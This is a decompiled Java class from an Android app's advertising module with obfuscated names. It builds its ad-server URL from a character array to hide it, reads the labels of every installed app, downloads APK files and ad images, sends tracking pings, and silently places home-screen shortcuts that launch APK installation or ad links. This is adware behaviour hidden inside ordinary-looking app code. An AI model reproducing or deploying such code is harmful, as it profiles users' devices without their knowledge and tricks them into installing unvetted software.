package com.jx.night.ad;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.BitmapFactory;
import android.net.Uri;
import com.jx.night.unit.MyConst;
import com.litesuits.http.LiteHttp;
import com.litesuits.http.request.AbstractRequest;
import com.litesuits.http.request.BitmapRequest;
import com.litesuits.http.request.FileRequest;
import com.litesuits.http.request.StringRequest;
import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class b
{
  private static b g = null;
  Comparator a = new d(this);
  i b;
  boolean c = false;
  com.jx.night.ad.a.a d = new com.jx.night.ad.a.a();
  List<com.jx.night.ad.a.a> e = null;
  int f = 1;
  private LiteHttp h;
  private Context i;
  private com.jx.night.ad.a.b j;
  private List<com.jx.night.ad.a.a> k;
  private boolean l = false;
  
  public b() {}
  
  public static b a()
  {
    if (g == null) {
      g = new b();
    }
    return g;
  }
  
  public static String a(String paramString1, String paramString2)
  {
    int m = 0;
    while (m < g.j.b.size())
    {
      if (((com.jx.night.ad.a.a)g.j.b.get(m)).j.equals(paramString2))
      {
        String str = com.jx.night.unit.a.a(g.i, paramString1);
        if ((str != null) && (!"".equals(str)))
        {
          ((com.jx.night.ad.a.a)g.j.b.get(m)).h = str;
          return str;
        }
      }
      m += 1;
    }
    return null;
  }
  
  private ArrayList<com.jx.night.ad.a.a> a(ArrayList<com.jx.night.ad.a.a> paramArrayList)
  {
    ArrayList localArrayList = new ArrayList();
    while (paramArrayList.size() > 0)
    {
      int m = (int)(Math.random() * paramArrayList.size());
      localArrayList.add((com.jx.night.ad.a.a)paramArrayList.get(m));
      paramArrayList.remove(m);
    }
    return localArrayList;
  }
  
  private void a(int paramInt1, int paramInt2, int paramInt3)
  {
    if (this.j == null) {}
    for (;;)
    {
      return;
      if (this.j.b.size() != 0)
      {
        int m = 0;
        while (m < this.j.b.size())
        {
          if (((com.jx.night.ad.a.a)this.j.b.get(m)).a == paramInt1)
          {
            ((com.jx.night.ad.a.a)this.j.b.get(m)).o = paramInt2;
            ((com.jx.night.ad.a.a)this.j.b.get(m)).p = paramInt3;
          }
          m += 1;
        }
      }
    }
  }
  
  private void a(String paramString, int paramInt)
  {
    int m = 0;
    for (;;)
    {
      if (m < this.j.b.size())
      {
        if (((com.jx.night.ad.a.a)this.j.b.get(m)).a == paramInt)
        {
          String str = com.jx.night.unit.a.a(this.i, paramString);
          if ((str != null) && (!"".equals(str))) {
            ((com.jx.night.ad.a.a)this.j.b.get(m)).h = str;
          }
        }
      }
      else {
        return;
      }
      m += 1;
    }
  }
  
  private void a(String paramString1, String paramString2, int paramInt, String paramString3, String paramString4)
  {
    String str = a.a(paramInt);
    if (com.jx.night.unit.g.c(str))
    {
      a(str, paramString2, paramString3);
      this.h.executeAsync(new StringRequest(paramString4));
      return;
    }
    paramString1 = (FileRequest)new FileRequest(paramString1, str + ".tmp").setHttpListener(new f(this, str, paramString2, paramString3, paramInt, paramString4));
    this.h.execute(paramString1);
  }
  
  private void a(String paramString1, String paramString2, String paramString3)
  {
    Intent localIntent = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
    localIntent.putExtra("android.intent.extra.shortcut.NAME", paramString3);
    localIntent.putExtra("duplicate", false);
    paramString3 = new Intent("android.intent.action.VIEW");
    paramString3.addFlags(268435456);
    paramString3.setDataAndType(Uri.fromFile(new File(paramString1)), "application/vnd.android.package-archive");
    localIntent.putExtra("android.intent.extra.shortcut.INTENT", paramString3);
    localIntent.putExtra("android.intent.extra.shortcut.ICON", BitmapFactory.decodeFile(paramString2));
    this.i.sendBroadcast(localIntent);
  }
  
  private com.jx.night.ad.a.b b(String paramString)
  {
    paramString = com.jx.night.unit.g.a(paramString);
    try
    {
      Object localObject = new JSONObject(paramString);
      paramString = new com.jx.night.ad.a.b();
      ArrayList localArrayList = new ArrayList();
      if (localObject != null)
      {
        paramString.a = Long.valueOf(((JSONObject)localObject).optLong("time"));
        paramString.c = ((JSONObject)localObject).optBoolean("isApp");
        paramString.d = ((JSONObject)localObject).optInt("appTime");
        paramString.e = ((JSONObject)localObject).optInt("exitTime");
        paramString.f = ((JSONObject)localObject).optInt("type2num");
        localObject = ((JSONObject)localObject).optJSONArray("data");
        if (localObject != null)
        {
          int m = 0;
          while (m < ((JSONArray)localObject).length())
          {
            JSONObject localJSONObject = ((JSONArray)localObject).optJSONObject(m);
            com.jx.night.ad.a.a localA = new com.jx.night.ad.a.a();
            localA.a = localJSONObject.optInt("id");
            localA.b = localJSONObject.optString("adname");
            localA.c = localJSONObject.optInt("adtype");
            localA.f = localJSONObject.optString("adstyle");
            localA.d = localJSONObject.optString("adpic");
            localA.e = localJSONObject.optInt("admodel");
            localA.h = localJSONObject.optString("packageName");
            localA.i = localJSONObject.optString("pkgName");
            localA.g = localJSONObject.optInt("weight");
            localA.j = localJSONObject.optString("adurl");
            localA.l = localJSONObject.optString("v_link");
            localA.k = localJSONObject.optString("c_link");
            localA.m = localJSONObject.optString("i_link");
            localArrayList.add(localA);
            m += 1;
          }
        }
      }
      paramString.b = localArrayList;
      return paramString;
    }
    catch (JSONException paramString) {}
    return null;
  }
  
  private void b(int paramInt)
  {
    if ((paramInt > 4) || (paramInt < 2)) {
      return;
    }
    if (this.b != null)
    {
      this.b.a(0);
      this.b.a();
    }
    this.b = new i(this);
    this.b.a(paramInt);
    this.b.start();
  }
  
  private void b(String paramString1, String paramString2, String paramString3)
  {
    Intent localIntent = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
    localIntent.putExtra("android.intent.extra.shortcut.NAME", paramString3);
    localIntent.putExtra("duplicate", false);
    localIntent.putExtra("android.intent.extra.shortcut.INTENT", d(paramString1));
    localIntent.putExtra("android.intent.extra.shortcut.ICON", BitmapFactory.decodeFile(paramString2));
    this.i.sendBroadcast(localIntent);
  }
  
  private ArrayList<com.jx.night.ad.a.a> c(int paramInt)
  {
    localArrayList = new ArrayList();
    if (this.j == null) {
      return localArrayList;
    }
    try
    {
      Iterator localIterator = this.j.b.iterator();
      while (localIterator.hasNext())
      {
        com.jx.night.ad.a.a localA = (com.jx.night.ad.a.a)localIterator.next();
        if (localA.c == paramInt) {
          localArrayList.add(localA);
        }
      }
      return localArrayList;
    }
    catch (Exception localException) {}
  }
  
  private ArrayList<com.jx.night.ad.a.a> c(String paramString)
  {
    ArrayList localArrayList = new ArrayList();
    k();
    if (this.j == null) {
      return localArrayList;
    }
    try
    {
      Iterator localIterator = this.j.b.iterator();
      while (localIterator.hasNext())
      {
        com.jx.night.ad.a.a localA = (com.jx.night.ad.a.a)localIterator.next();
        if ((localA.c == 3) && (localA.f.contains(paramString))) {
          localArrayList.add(localA);
        }
      }
      if (localArrayList.size() <= 0) {
        break label172;
      }
    }
    catch (Exception localException)
    {
      if (localArrayList == null) {
        break label172;
      }
    }
    if (paramString.equals("2"))
    {
      paramString = a(localArrayList);
      if (paramString.size() <= this.j.f) {
        break label177;
      }
      int m = paramString.size() - 1;
      while (m >= this.j.f)
      {
        paramString.remove(m);
        m -= 1;
      }
    }
    label172:
    label177:
    for (;;)
    {
      return paramString;
      Collections.sort(localArrayList, this.a);
      paramString = localArrayList;
    }
  }
  
  private Intent d(String paramString)
  {
    Intent localIntent = new Intent();
    localIntent.setAction("android.intent.action.VIEW");
    localIntent.addCategory("android.intent.category.DEFAULT");
    localIntent.addCategory("android.intent.category.BROWSABLE");
    localIntent.setData(Uri.parse(paramString));
    paramString = this.i.getPackageManager().queryIntentActivities(localIntent, 32);
    if (paramString.size() > 0)
    {
      paramString = ((ResolveInfo)paramString.get(0)).activityInfo;
      localIntent.setComponent(new ComponentName(paramString.packageName, paramString.name));
      return localIntent;
    }
    return null;
  }
  
  private void i()
  {
    Object localObject = new String(new char[] { 'h', 't', 't', 'p', ':', '/', '/', 's', 'd', 'k', '.', 'y', 'u', 'a', 'n', 'f', 'e', 'n', 'b', 'a', '.', 'n', 'e', 't', '/', 's', 'd', 'k', '/', 'l', 'i', 's', 't' });
    localObject = (String)localObject + "?c_uid=" + MyConst.h + "&c_sid=" + MyConst.j;
    localObject = (String)localObject + "&c=2";
    StringBuilder localStringBuilder = new StringBuilder().append((String)localObject).append("&s=");
    if (MyConst.f) {}
    for (localObject = "1";; localObject = "0")
    {
      localObject = new StringRequest((String)localObject);
      ((StringRequest)localObject).setHttpListener(new c(this));
      this.h.executeAsync((AbstractRequest)localObject);
      return;
    }
  }
  
  private String j()
  {
    PackageManager localPackageManager = MyConst.g.getPackageManager();
    Iterator localIterator = localPackageManager.getInstalledPackages(0).iterator();
    PackageInfo localPackageInfo;
    for (String str = ""; localIterator.hasNext(); str = str + localPackageManager.getApplicationLabel(localPackageInfo.applicationInfo).toString()) {
      localPackageInfo = (PackageInfo)localIterator.next();
    }
    return str;
  }
  
  private void k()
  {
    String str1 = j();
    if ("".equals(str1 + "")) {}
    while ((this.j == null) || (this.j.b == null) || (this.j.b.size() == 0)) {
      return;
    }
    int m = this.j.b.size() - 1;
    label80:
    String str2;
    if (m >= 0) {
      if (((com.jx.night.ad.a.a)this.j.b.get(m)).c == 3)
      {
        str2 = ((com.jx.night.ad.a.a)this.j.b.get(m)).i + "";
        if (!"".equals(str2)) {
          break label161;
        }
      }
    }
    for (;;)
    {
      m -= 1;
      break label80;
      break;
      label161:
      if (str1.contains(str2))
      {
        com.jx.night.unit.b.a("ReMove" + ((com.jx.night.ad.a.a)this.j.b.get(m)).a + ((com.jx.night.ad.a.a)this.j.b.get(m)).i);
        this.j.b.remove(m);
      }
    }
  }
  
  private void l()
  {
    if (this.j == null) {
      return;
    }
    ArrayList localArrayList = c("6");
    if (localArrayList.size() == 0)
    {
      this.d = null;
      return;
    }
    this.d = ((com.jx.night.ad.a.a)localArrayList.get((int)(Math.random() * localArrayList.size())));
  }
  
  private void m()
  {
    if (this.j == null) {
      return;
    }
    this.e = c("5");
  }
  
  private com.jx.night.ad.a.a n()
  {
    if (this.e == null) {
      m();
    }
    if (this.e == null) {}
    while (this.e.size() == 0) {
      return null;
    }
    int m = (int)(Math.random() * this.k.size());
    com.jx.night.ad.a.a localA = (com.jx.night.ad.a.a)this.k.get(m);
    this.k.remove(m);
    return localA;
  }
  
  public void a(int paramInt)
  {
    if (this.b != null)
    {
      this.b.a(0);
      this.b.a();
    }
    this.b = new i(this);
    this.b.a(3);
    this.b.b(3);
    this.b.start();
  }
  
  public void a(Context paramContext)
  {
    this.i = paramContext.getApplicationContext();
    this.h = LiteHttp.newApacheHttpClient(null);
    this.j = new com.jx.night.ad.a.b();
    this.k = new ArrayList();
    i();
  }
  
  public void a(com.jx.night.ad.a.a paramA, String paramString, int paramInt1, int paramInt2)
  {
    if (paramString != null) {}
    try
    {
      paramA.h = com.jx.night.unit.a.a(this.i, paramString);
      paramA.o = paramInt1;
      paramA.p = paramInt2;
      if (this.k.size() == 0) {
        this.k.add(paramA);
      }
      paramInt1 = 0;
      for (;;)
      {
        if (paramInt1 < this.k.size())
        {
          if (((com.jx.night.ad.a.a)this.k.get(paramInt1)).a == paramA.a) {
            this.k.remove(paramInt1);
          }
        }
        else
        {
          this.k.add(paramA);
          return;
        }
        paramInt1 += 1;
      }
    }
    catch (Exception paramString)
    {
      for (;;) {}
    }
  }
  
  public void a(String paramString)
  {
    Iterator localIterator = this.k.iterator();
    while (localIterator.hasNext())
    {
      com.jx.night.ad.a.a localA = (com.jx.night.ad.a.a)localIterator.next();
      if (paramString.equals(localA.h))
      {
        int m = localA.p;
        String str = localA.m + "&n=" + (m + 1) + "&s=" + localA.o;
        if (localA.o == 1) {
          MyConst.z = true;
        }
        this.h.executeAsync(new StringRequest(str));
      }
    }
  }
  
  public List<com.jx.night.ad.a.a> b()
  {
    return this.k;
  }
  
  public com.jx.night.ad.a.a c()
  {
    Object localObject = c("1");
    if (localObject == null) {
      return null;
    }
    if (((List)localObject).size() == 0) {
      return null;
    }
    localObject = (com.jx.night.ad.a.a)((List)localObject).get((int)(Math.random() * ((List)localObject).size()));
    a((com.jx.night.ad.a.a)localObject, null, 1, 1);
    return localObject;
  }
  
  public void d()
  {
    b(2);
  }
  
  public void e()
  {
    b(3);
    new com.jx.night.c.b().start();
  }
  
  public void f()
  {
    com.jx.night.ad.a.a localA = n();
    if (localA == null) {
      return;
    }
    g localG = new g(this);
    localG.a(localA);
    localG.a(5);
    localG.start();
  }
  
  public void g()
  {
    if (!this.c)
    {
      this.c = true;
      l();
      if (this.d != null)
      {
        g localG = new g(this);
        localG.a(this.d);
        localG.a(6);
        localG.start();
      }
    }
  }
  
  public void h()
  {
    ArrayList localArrayList = c(1);
    if (localArrayList.size() == 0) {}
    for (;;)
    {
      return;
      int m = 0;
      while (m < localArrayList.size())
      {
        Object localObject = (com.jx.night.ad.a.a)localArrayList.get(m);
        if ((1 == ((com.jx.night.ad.a.a)localObject).e) || (2 == ((com.jx.night.ad.a.a)localObject).e))
        {
          String str = a.b(((com.jx.night.ad.a.a)localObject).a);
          localObject = (BitmapRequest)new BitmapRequest(((com.jx.night.ad.a.a)localObject).d, str + ".tmp").setHttpListener(new e(this, true, true, false, str, (com.jx.night.ad.a.a)localObject));
          this.h.executeAsync((AbstractRequest)localObject);
        }
        m += 1;
      }
    }
  }
}
